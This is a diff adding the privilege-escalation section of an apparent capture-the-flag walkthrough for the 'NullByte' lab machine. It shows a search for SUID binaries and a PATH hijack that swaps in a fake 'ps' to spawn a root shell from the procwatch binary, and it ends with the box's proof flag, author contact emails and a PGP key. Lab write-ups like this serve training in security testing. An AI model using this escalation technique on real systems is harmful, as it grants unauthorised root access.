@@ -183,7 +183,100 @@ uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
 
 ## 4.Privilege Escalation
 
+Search for the file which have SUID bit set on them :
 
+```text
+ramses@NullByte:~$ find / -user root -perm /4000 2>/dev/null
+
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/pt_chown
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/procmail
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/sbin/exim4
+/var/www/backup/procwatch
+/bin/su
+/bin/mount
+/bin/umount
+/sbin/mount.nfs
+```
+
+the binary `procwatch` is interesting let's check it :
+
+```text
+ramses@NullByte:~$ cd /var/www/backup/
+ramses@NullByte:/var/www/backup$ ./procwatch
+  PID TTY          TIME CMD
+ 1496 pts/0    00:00:00 procwatch
+ 1497 pts/0    00:00:00 sh
+ 1498 pts/0    00:00:00 ps
+```
+
+it's output is very similar to `ps` output, maybe we can exploit this by manuplating a custome ps binary and PATH variable :
+
+```text
+ramses@NullByte:/var/www/backup$ echo '/bin/sh' > ps
+
+ramses@NullByte:/var/www/backup$ cat ps
+/bin/sh
+
+ramses@NullByte:/var/www/backup$ chmod +x ps
+
+ramses@NullByte:/var/www/backup$ export PATH=$PWD:$PATH
+
+ramses@NullByte:/var/www/backup$ ./procwatch
+# id
+uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
+```
+
+yes, we are root now let's check `/root` directory :
+
+```text
+# cd /root
+
+# ls
+proof.txt
+
+# cat proof.txt
+adf11c7a9e6523e630aaf3b9b7acb51d
+
+It seems that you have pwned the box, congrats.
+Now you done that I wanna talk with you. Write a walk & mail at
+xly0n@sigaint.org attach the walk and proof.txt
+If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+
+USE THIS PGP PUBLIC KEY
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: BCPG C# v1.6.1.0
+
+mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
+Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
+e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
+Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
++z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
+YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
+Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
+HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
+m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
+XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
+kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
+TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
+Gms=
+=PiAQ
+-----END PGP PUBLIC KEY BLOCK-----
+```
+
+This is how you can finish thix box :)
 
 
 
